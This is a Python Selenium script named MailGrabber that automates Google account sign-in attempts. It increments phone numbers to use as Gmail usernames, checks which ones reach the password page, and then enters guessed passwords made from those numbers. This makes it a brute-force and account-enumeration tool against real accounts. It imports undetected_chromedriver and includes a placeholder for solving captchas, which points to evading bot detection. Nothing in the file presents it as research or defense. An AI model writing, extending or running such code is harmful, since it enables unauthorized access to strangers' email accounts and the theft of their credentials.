import os
import selenium
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.action_chains import ActionChains
from time import sleep
from selenium.webdriver.chrome.options import Options
import undetected_chromedriver as uc


class MailGrabber(webdriver.Chrome):
    def __init__(self, driver=webdriver.Chrome, teardown=False):
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-infobars")
        self.driver = driver
        self.teardown = teardown
        super(MailGrabber, self).__init__()
        self.maximize_window()
        self.implicitly_wait(30)

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.teardown:
            self.quit()

    def go_to_gmail(self, url):
        if url is not None:
            self.get(url)
        else:
            return None

    def show_intro(self):
        text = "WELCOME TO MAILGRABBER"
        headline = text.upper().center(80, '#')
        headline = f"\033[38;5;208m\033[1m\033[120m{headline}\033[0m"
        print(headline)

    def solve_captcha(self):
        pass

    def start_grabbing(self, x_path, number, amount, length_of_password):
        arr = []
        pass_arr = []
        success_email = []
        password_url = "https://accounts.google.com/v3/signin/challenge/pwd?TL=ALbfvL3NQ06cSKbTPLbo" \
                       "-N_E8IBvg6pv5MGySGo7u-msP7SY7thja3BflZNMQP4p&checkConnection=youtube%3A220%3A0&checkedDomains" \
                       "=youtube&cid=2&continue=https%3A%2F%2Fmail.google.com&dsh=S-1727980091%3A1678894620075701" \
                       "&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en&pstMsg=1&service=mail&authuser=0 "

        wait = WebDriverWait(self, 25)
        email = wait.until(EC.element_to_be_clickable((By.XPATH, x_path)))

        submit_email = wait.until(EC.element_to_be_clickable((
            By.XPATH, "//span[normalize-space()='Next']"
        )))

        email.click()
        i = 1
        k = 1
        while i <= amount:
            i += 1
            number = int(number) + 1
            arr.append(number)
            pass_arr.append(str(number)[:length_of_password])
            print("Choosen Numbers for trying to grab Email => " + str(arr))
            print("Choosen Passwords => " + str(pass_arr))

        while k <= amount:
            k += 1
            for j in arr:
                email.send_keys("0" + str(j))
                submit_email.click()
                print("Tried => " + str(j))
                if self.current_url == password_url:
                    print("One email worked")
                    success_email.append(j)
                    print("Success Email" + str(j))
                    # pass password from here
                    for z in pass_arr:
                        password = wait.until(EC.element_to_be_clickable((
                            By.XPATH, "//input[@name='Passwd']"
                        )))
                        password.click()
                        password.send_keys(z)

                sleep(10)
                email.clear()
        print("Numbers logs = > ", arr)
        print("Testing all the numbers....")
        print("Tried => ", len(arr), "times")


